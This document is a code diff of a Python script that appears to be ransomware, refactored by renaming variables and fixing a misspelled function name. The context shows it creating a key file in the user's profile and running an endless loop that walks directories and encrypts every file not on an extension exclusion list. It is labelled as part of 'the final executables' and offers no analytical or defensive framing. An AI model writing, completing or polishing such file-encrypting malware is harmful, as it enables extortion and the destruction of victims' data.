@@ -9,11 +9,11 @@ import os, sys, socket, wget, struct, ctypes, shutil, base64
 
 """ THIS FILE IS PART OF THE FINAL EXECUTABLES """
 
-# ENVIRONMENT VARIABLE
-letter_drive_path = os.environ["SystemDrive"]
-usr = os.environ["USERNAME"]
+# GET THE ENVIRONMENT VARIABLE
+letter_drive = os.environ["SystemDrive"]
+current_user = os.environ["USERNAME"]
 
-usrkey = "{}\\Users\\{}\\{}.key".format(letter_drive_path, usr, usr)
+usrkey = "{}\\Users\\{}\\{}.key".format(letter_drive, current_user, current_user)
 
 # GENERATE KEY FUNCTION
 def genkey(name):
@@ -23,7 +23,7 @@ def genkey(name):
         file.write(key)
 
 # FILE ENCYPTING FUNCTION
-def file_ecrypt(key, name):
+def file_encrypt(key, name):
     with open(name,'rb') as files:
         data = files.read()
 
@@ -39,7 +39,7 @@ def file_ecrypt(key, name):
         pass
 
 # CALL FUNCTION TO GENERATE KEY
-genkey(usr)
+genkey(current_user)
 
 # FOR EVERYTIME ENCRYPTING FILES
 while True:
@@ -58,7 +58,7 @@ while True:
                             if not(ext in my_ext):
                                 try:
                                     ally = os.path.join(root, file)
-                                    file_ecrypt(key, ally)
+                                    file_encrypt(key, ally)
                                 except PermissionError:
                                     pass
                                 except:
